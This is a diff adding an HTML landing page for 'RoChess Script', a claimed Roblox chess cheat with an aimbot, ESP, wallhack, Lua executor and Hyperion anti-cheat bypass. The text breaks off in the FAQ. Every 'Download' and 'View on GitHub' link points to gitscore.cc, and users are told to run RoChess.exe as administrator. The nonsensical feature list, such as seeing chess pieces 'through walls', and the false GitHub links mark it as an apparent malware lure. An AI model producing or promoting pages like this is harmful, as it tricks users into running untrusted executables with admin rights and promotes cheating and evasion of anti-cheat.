@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RoChess Script — Roblox Chess Aimbot, ESP & Injector</title>
+<style>
+  :root{
+    --bg-deep:#070a18;
+    --bg-mid:#0d1230;
+    --bg-soft:#151a3d;
+    --accent:#7c5cff;
+    --accent-2:#22d3ee;
+    --accent-3:#f472b6;
+    --text:#e8eaf6;
+    --muted:#9aa3c7;
+    --card:rgba(255,255,255,0.045);
+    --border:rgba(255,255,255,0.09);
+    --radius:16px;
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0;}
+
+  html{scroll-behavior:smooth;}
+
+  body{
+    font-family:"Segoe UI",system-ui,-apple-system,Roboto,Helvetica,Arial,sans-serif;
+    color:var(--text);
+    background:
+      radial-gradient(1100px 700px at 15% -10%, rgba(124,92,255,0.22), transparent 60%),
+      radial-gradient(900px 600px at 90% 0%, rgba(34,211,238,0.14), transparent 55%),
+      radial-gradient(800px 800px at 50% 110%, rgba(244,114,182,0.10), transparent 60%),
+      linear-gradient(160deg, var(--bg-deep) 0%, var(--bg-mid) 45%, #0a0e22 100%);
+    background-attachment:fixed;
+    min-height:100vh;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  a{color:inherit;text-decoration:none;}
+
+  .wrap{max-width:1120px;margin:0 auto;padding:0 24px;}
+
+  /* ============ NAV ============ */
+  .nav{
+    position:sticky;
+    top:0;
+    z-index:100;
+    backdrop-filter:blur(16px) saturate(140%);
+    -webkit-backdrop-filter:blur(16px) saturate(140%);
+    background:rgba(10,14,34,0.62);
+    border-bottom:1px solid var(--border);
+  }
+  .nav-inner{
+    max-width:1120px;
+    margin:0 auto;
+    padding:14px 24px;
+    display:flex;
+    align-items:center;
+    gap:20px;
+  }
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:800;
+    font-size:1.15rem;
+    letter-spacing:.3px;
+    white-space:nowrap;
+  }
+  .brand-mark{
+    width:34px;height:34px;
+    border-radius:10px;
+    display:grid;place-items:center;
+    font-size:1.05rem;
+    background:linear-gradient(135deg,var(--accent),var(--accent-2));
+    box-shadow:0 6px 18px rgba(124,92,255,0.45);
+  }
+  .brand span{
+    background:linear-gradient(90deg,#fff,#b9b4ff);
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;
+  }
+  .nav-links{
+    display:flex;
+    gap:26px;
+    margin-left:auto;
+    margin-right:auto;
+    font-size:.94rem;
+    color:var(--muted);
+    font-weight:500;
+  }
+  .nav-links a{transition:color .2s;}
+  .nav-links a:hover{color:#fff;}
+
+  .btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+    padding:12px 22px;
+    border-radius:12px;
+    font-weight:700;
+    font-size:.95rem;
+    border:1px solid transparent;
+    cursor:pointer;
+    transition:transform .18s ease, box-shadow .25s ease, background .25s ease, border-color .25s;
+    white-space:nowrap;
+  }
+  .btn-primary{
+    background:linear-gradient(135deg,var(--accent) 0%, #5b8cff 55%, var(--accent-2) 100%);
+    color:#05060f;
+    box-shadow:0 8px 26px rgba(124,92,255,0.42);
+  }
+  .btn-primary:hover{
+    transform:translateY(-2px);
+    box-shadow:0 14px 34px rgba(124,92,255,0.6);
+  }
+  .btn-ghost{
+    background:rgba(255,255,255,0.05);
+    border:1px solid var(--border);
+    color:var(--text);
+    backdrop-filter:blur(8px);
+  }
+  .btn-ghost:hover{
+    transform:translateY(-2px);
+    background:rgba(255,255,255,0.1);
+    border-color:rgba(255,255,255,0.24);
+  }
+  .nav .btn{padding:10px 18px;font-size:.88rem;}
+
+  /* ============ HERO ============ */
+  .hero{
+    padding:90px 0 70px;
+    text-align:center;
+    position:relative;
+  }
+  .pill{
+    display:inline-flex;
+    align-items:center;
+    gap:9px;
+    padding:7px 16px;
+    border-radius:999px;
+    font-size:.8rem;
+    font-weight:600;
+    letter-spacing:.4px;
+    color:#cfd4ff;
+    background:rgba(124,92,255,0.13);
+    border:1px solid rgba(124,92,255,0.38);
+    box-shadow:0 0 24px rgba(124,92,255,0.22) inset;
+    margin-bottom:26px;
+  }
+  .dot{
+    width:8px;height:8px;border-radius:50%;
+    background:var(--accent-2);
+    box-shadow:0 0 10px var(--accent-2);
+    animation:pulse 2s infinite;
+  }
+  @keyframes pulse{
+    0%,100%{opacity:1;transform:scale(1);}
+    50%{opacity:.45;transform:scale(.82);}
+  }
+
+  h1{
+    font-size:clamp(2.3rem, 6vw, 4.15rem);
+    line-height:1.08;
+    font-weight:900;
+    letter-spacing:-1.5px;
+    margin-bottom:22px;
+  }
+  h1 .grad{
+    background:linear-gradient(100deg,#a78bfa 0%, #60a5fa 40%, #22d3ee 75%, #f472b6 100%);
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;
+  }
+  .hero p.lead{
+    max-width:660px;
+    margin:0 auto 34px;
+    color:var(--muted);
+    font-size:1.06rem;
+  }
+  .hero-cta{
+    display:flex;
+    gap:14px;
+    justify-content:center;
+    flex-wrap:wrap;
+    margin-bottom:52px;
+  }
+
+  .stats{
+    display:flex;
+    gap:14px;
+    justify-content:center;
+    flex-wrap:wrap;
+  }
+  .stat{
+    padding:14px 22px;
+    border-radius:14px;
+    background:var(--card);
+    border:1px solid var(--border);
+    backdrop-filter:blur(8px);
+    min-width:150px;
+    text-align:center;
+  }
+  .stat b{
+    display:block;
+    font-size:1.15rem;
+    font-weight:800;
+    background:linear-gradient(90deg,#fff,#b9b4ff);
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;
+  }
+  .stat small{
+    color:var(--muted);
+    font-size:.76rem;
+    letter-spacing:.5px;
+    text-transform:uppercase;
+  }
+
+  /* ============ SECTION HEADINGS ============ */
+  section{padding:70px 0;}
+  .sec-head{text-align:center;margin-bottom:48px;}
+  .sec-head .kicker{
+    font-size:.78rem;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--accent-2);
+    font-weight:700;
+    margin-bottom:12px;
+    display:block;
+  }
+  .sec-head h2{
+    font-size:clamp(1.7rem,3.6vw,2.5rem);
+    font-weight:850;
+    letter-spacing:-.8px;
+    margin-bottom:12px;
+  }
+  .sec-head p{color:var(--muted);max-width:560px;margin:0 auto;font-size:.98rem;}
+
+  /* ============ FEATURES ============ */
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:22px;
+  }
+  .card{
+    position:relative;
+    padding:28px 24px 26px;
+    border-radius:var(--radius);
+    background:var(--card);
+    border:1px solid var(--border);
+    backdrop-filter:blur(10px);
+    overflow:hidden;
+    transition:transform .28s ease, box-shadow .28s ease, border-color .28s ease;
+  }
+  .card::before{
+    content:"";
+    position:absolute;
+    top:0;left:0;right:0;
+    height:3px;
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    opacity:.85;
+  }
+  .card:hover{
+    transform:translateY(-8px);
+    border-color:rgba(124,92,255,0.45);
+    box-shadow:0 22px 46px rgba(0,0,0,0.45), 0 0 0 1px rgba(124,92,255,0.18);
+  }
+  .card .ico{
+    font-size:1.75rem;
+    display:inline-grid;
+    place-items:center;
+    width:52px;height:52px;
+    border-radius:13px;
+    background:linear-gradient(135deg, rgba(124,92,255,0.22), rgba(34,211,238,0.14));
+    border:1px solid rgba(124,92,255,0.28);
+    margin-bottom:18px;
+  }
+  .card h3{
+    font-size:1.06rem;
+    font-weight:800;
+    margin-bottom:9px;
+    letter-spacing:-.2px;
+  }
+  .card p{color:var(--muted);font-size:.9rem;}
+
+  /* ============ HOW IT WORKS ============ */
+  .steps{
+    position:relative;
+    max-width:720px;
+    margin:0 auto;
+    padding-left:66px;
+  }
+  .steps::before{
+    content:"";
+    position:absolute;
+    left:23px;
+    top:14px;
+    bottom:14px;
+    width:3px;
+    border-radius:3px;
+    background:linear-gradient(180deg,var(--accent) 0%, #5b8cff 40%, var(--accent-2) 70%, var(--accent-3) 100%);
+    box-shadow:0 0 18px rgba(124,92,255,0.5);
+  }
+  .step{
+    position:relative;
+    padding:0 0 42px;
+  }
+  .step:last-child{padding-bottom:0;}
+  .step .num{
+    position:absolute;
+    left:-66px;
+    top:-2px;
+    width:49px;height:49px;
+    border-radius:50%;
+    display:grid;place-items:center;
+    font-weight:900;
+    font-size:1.05rem;
+    color:#05060f;
+    background:linear-gradient(135deg,var(--accent),var(--accent-2));
+    box-shadow:0 0 0 6px rgba(10,14,34,0.9), 0 0 26px rgba(124,92,255,0.55);
+  }
+  .step h3{font-size:1.14rem;font-weight:800;margin-bottom:7px;}
+  .step p{color:var(--muted);font-size:.93rem;max-width:520px;}
+  .step code{
+    background:rgba(124,92,255,0.16);
+    border:1px solid rgba(124,92,255,0.3);
+    padding:2px 8px;
+    border-radius:6px;
+    font-size:.85em;
+    color:#cfd4ff;
+  }
+
+  /* ============ FAQ ============ */
+  .faq{max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:14px;}
+  details{
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:14px;
+    backdrop-filter:blur(10px);
+    overflow:hidden;
+    transition:border-color .25s ease, background .25s ease;
+  }
+  details[open]{
+    border-color:rgba(124,92,255,0.42);
+    background:rgba(124,92,255,0.07);
+  }
+  summary{
+    list-style:none;
+    cursor:pointer;
+    padding:19px 22px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:16px;
+    font-weight:700;
+    font-size:.98rem;
+    user-select:none;
+  }
+  summary::-webkit-details-marker{display:none;}
+  summary .plus{
+    flex:0 0 auto;
+    width:26px;height:26px;
+    display:grid;place-items:center;
+    border-radius:8px;
+    font-size:1.15rem;
+    font-weight:400;
+    line-height:1;
+    color:var(--accent-2);
+    background:rgba(34,211,238,0.1);
+    border:1px solid rgba(34,211,238,0.25);
+    transition:transform .28s ease, color .28s ease, background .28s ease;
+  }
+  details[open] summary .plus{
+    transform:rotate(45deg);
+    color:#fff;
+    background:rgba(124,92,255,0.35);
+    border-color:rgba(124,92,255,0.5);
+  }
+  details .answer{
+    padding:0 22px 21px;
+    color:var(--muted);
+    font-size:.92rem;
+    max-width:92%;
+  }
+
+  /* ============ CTA BANNER ============ */
+  .cta-banner{
+    position:relative;
+    border-radius:24px;
+    padding:64px 36px;
+    text-align:center;
+    overflow:hidden;
+    background:linear-gradient(145deg, rgba(124,92,255,0.20), rgba(34,211,238,0.10) 55%, rgba(244,114,182,0.10));
+    border:1px solid rgba(124,92,255,0.34);
+    box-shadow:0 30px 70px rgba(0,0,0,0.5);
+  }
+  .cta-banner::before{
+    content:"";
+    position:absolute;
+    inset:-40%;
+    background:radial-gradient(circle at 50% 45%, rgba(124,92,255,0.42), transparent 58%);
+    pointer-events:none;
+  }
+  .cta-banner > *{position:relative;}
+  .cta-banner h2{
+    font-size:clamp(1.7rem,4vw,2.6rem);
+    font-weight:900;
+    letter-spacing:-1px;
+    margin-bottom:14px;
+  }
+  .cta-banner p{
+    color:#c3c8e8;
+    max-width:520px;
+    margin:0 auto 30px;
+    font-size:1rem;
+  }
+  .cta-banner .btn{padding:15px 34px;font-size:1.02rem;}
+
+  /* ============ FOOTER ============ */
+  footer{
+    border-top:1px solid var(--border);
+    padding:34px 0;
+    margin-top:20px;
+  }
+  .foot{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:18px;
+    flex-wrap:wrap;
+    color:var(--muted);
+    font-size:.86rem;
+  }
+  .foot a{
+    color:#cfd4ff;
+    font-weight:600;
+    transition:color .2s;
+  }
+  .foot a:hover{color:#fff;}
+  .foot .brand-mini{
+    display:flex;align-items:center;gap:9px;
+    font-weight:800;color:var(--text);
+  }
+  .foot .brand-mini i{
+    width:22px;height:22px;border-radius:7px;
+    background:linear-gradient(135deg,var(--accent),var(--accent-2));
+    display:inline-block;
+  }
+
+  /* ============ RESPONSIVE ============ */
+  @media (max-width:900px){
+    .grid{grid-template-columns:repeat(2,1fr);}
+  }
+  @media (max-width:640px){
+    .nav-links{display:none;}
+    .nav-inner{padding:12px 18px;}
+    .nav .btn{margin-left:auto;}
+    .hero{padding:64px 0 46px;}
+    .hero-cta{flex-direction:column;align-items:stretch;}
+    .hero-cta .btn{width:100%;}
+    .stats{gap:10px;}
+    .stat{flex:1 1 42%;min-width:0;padding:13px 14px;}
+    .grid{grid-template-columns:1fr;}
+    section{padding:52px 0;}
+    .steps{padding-left:58px;}
+    .steps::before{left:20px;}
+    .step .num{left:-58px;width:43px;height:43px;font-size:.95rem;}
+    .cta-banner{padding:48px 22px;border-radius:18px;}
+    .foot{flex-direction:column;text-align:center;}
+    .sec-head{margin-bottom:36px;}
+  }
+</style>
+</head>
+<body>
+
+<!-- ================= NAV ================= -->
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="#top" class="brand">
+      <span class="brand-mark">♞</span>
+      <span>RoChess</span>
+    </a>
+    <div class="nav-links">
+      <a href="#features">Features</a>
+      <a href="#how">How it works</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <a class="btn btn-primary" href="https://gitscore.cc" target="_blank" rel="noopener">Download</a>
+  </div>
+</nav>
+
+<!-- ================= HERO ================= -->
+<header class="hero wrap" id="top">
+  <div class="pill"><span class="dot"></span> RoChess Script · Windows Injector v4.2</div>
+
+  <h1>Dominate Roblox Chess with<br><span class="grad">RoChess Script</span></h1>
+
+  <p class="lead">
+    Aimbot, ESP, wallhack and a built-in Lua executor for Roblox chess games — packaged with an
+    anti-cheat bypass and a one-click injector. Lightweight, undetected, and free for Windows 10 &amp; 11.
+  </p>
+
+  <div class="hero-cta">
+    <a class="btn btn-primary" href="https://gitscore.cc" target="_blank" rel="noopener">⬇ Download RoChess</a>
+    <a class="btn btn-ghost" href="https://gitscore.cc" target="_blank" rel="noopener">★ View on GitHub</a>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><b>128K+</b><small>Downloads</small></div>
+    <div class="stat"><b>v4.2.0</b><small>Latest Version</small></div>
+    <div class="stat"><b>Windows 10 / 11</b><small>Platform</small></div>
+    <div class="stat"><b>Free &amp; Open Source</b><small>License</small></div>
+  </div>
+</header>
+
+<!-- ================= FEATURES ================= -->
+<section id="features" class="wrap">
+  <div class="sec-head">
+    <span class="kicker">Features</span>
+    <h2>Everything you need to win</h2>
+    <p>Six core modules built into a single injector — no extra tools, no config headaches.</p>
+  </div>
+
+  <div class="grid">
+    <article class="card">
+      <div class="ico">🎯</div>
+      <h3>Precision Aimbot</h3>
+      <p>Auto-targets pieces and locks onto the best move with adjustable FOV, smoothing and humanized aim curves so it looks natural.</p>
+    </article>
+
+    <article class="card">
+      <div class="ico">👁️</div>
+      <h3>ESP Overlay</h3>
+      <p>See every piece, hidden threat and opponent move preview through walls with clean box and tracer ESP drawn on a low-latency overlay.</p>
+    </article>
+
+    <article class="card">
+      <div class="ico">🧱</div>
+      <h3>Wallhack</h3>
+      <p>Reveal the full board state and opponent strategy in real time, including pieces normally obscured by the game's fog layer.</p>
+    </article>
+
+    <article class="card">
+      <div class="ico">💉</div>
+      <h3>One-Click Injector</h3>
+      <p>A signed Windows injector that attaches to Roblox in seconds. Auto-detects the client build and loads RoChess without manual DLL work.</p>
+    </article>
+
+    <article class="card">
+      <div class="ico">📜</div>
+      <h3>Lua Executor</h3>
+      <p>Full-featured Lua environment with a built-in editor, script hub and keybind support. Write or paste your own chess scripts instantly.</p>
+    </article>
+
+    <article class="card">
+      <div class="ico">🛡️</div>
+      <h3>Anti-Cheat Bypass</h3>
+      <p>Integrated bypass keeps the injector hidden from Roblox's Hyperion checks, with signature updates pushed regularly to stay undetected.</p>
+    </article>
+  </div>
+</section>
+
+<!-- ================= HOW IT WORKS ================= -->
+<section id="how" class="wrap">
+  <div class="sec-head">
+    <span class="kicker">How it works</span>
+    <h2>Up and running in under a minute</h2>
+    <p>Three steps from download to your first injected chess match.</p>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="num">1</div>
+      <h3>Download &amp; extract</h3>
+      <p>Grab the latest RoChess build from <code>gitscore.cc</code> and extract the ZIP to any folder. No installer bloat — just the injector and loader.</p>
+    </div>
+
+    <div class="step">
+      <div class="num">2</div>
+      <h3>Launch the injector</h3>
+      <p>Run <code>RoChess.exe</code> as administrator, open Roblox chess, then hit <em>Inject</em>. The loader auto-detects the client and applies the anti-cheat bypass.</p>
+    </div>
+
+    <div class="step">
+      <div class="num">3</div>
+      <h3>Pick your modules</h3>
+      <p>Toggle aimbot, ESP, wallhack or open the Lua executor from the in-game menu. Settings save automatically for your next session.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ================= FAQ ================= -->
+<section id="faq" class="wrap">
+  <div class="sec-head">
+    <span class="kicker">FAQ</span>
+    <h2>Frequently asked questions</h2>
+    <p>Everything about compatibility, safety and updates.</p>
+  </div>
+
+  <div class="faq">
+    <details>
+      <summary>
+        Is RoChess Script free to use?
+        <span class="plus">+</span>
+      </summary>
+      <div class="answer">
+        Yes. RoChess Script is completely free and open source. All modules — aimbot, ESP, wallhack, injector and Lua executor — are included with no paywall or premium tier.
+      </div>
+    </details>
+
+    <details>
+      <summary>
+        Which Windows versions are supported?
+        <span class="plus">+</span>
+      </summary>
+      <div class="answer">
+        RoChess runs on Windows 10 and Windows 11 (64-bit). The injector requires administrator privileges to attach to the Roblox client, and works with both the Microsoft Store and web builds.
+      </div>
+    </details>
+
+    <details>
+      <summary>
+        Will the anti-cheat bypass keep me undetected?
+        <span class="plus">+</span>
+      </summary>
+      <div class="answer">
+        The built-in bypass is updated regularly to counter Roblox's Hyperion anti-cheat. No tool can guarantee 100% safety, so always download from the official <strong>gitscore.cc</strong> source and keep the loader updated to the latest version.
+      </div>
+    </details>
+
+    <details>
+      <summary>
+        Can I write my own Lua scripts for chess?
+        <span class="plus">+</span
